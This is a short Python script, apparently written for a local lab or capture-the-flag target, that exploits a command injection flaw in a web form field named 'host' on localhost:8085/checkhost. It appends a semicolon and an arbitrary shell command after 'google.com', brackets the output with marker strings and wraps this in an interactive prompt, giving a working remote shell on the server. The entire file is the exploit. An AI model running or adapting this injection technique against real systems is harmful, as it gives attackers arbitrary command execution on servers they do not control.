#!/usr/bin/env python3

import requests
import cmd

URL = "http://localhost:8085/checkhost"

def sendit(command):
    r = requests.post(URL, data={
        "host": f"google.com ; echo -n AGR0ABC123 ; {command} ; echo -n AGR0ABC123 #"
        })
    return sanitize(r.text)

def sanitize(output):
    return output.split("AGR0ABC123")[1]

class Terminal(cmd.Cmd):
    prompt = "L33T > "

    def default(self, args):
        print(sendit(args))

if __name__ == "__main__":
    term = Terminal()
    term.cmdloop()
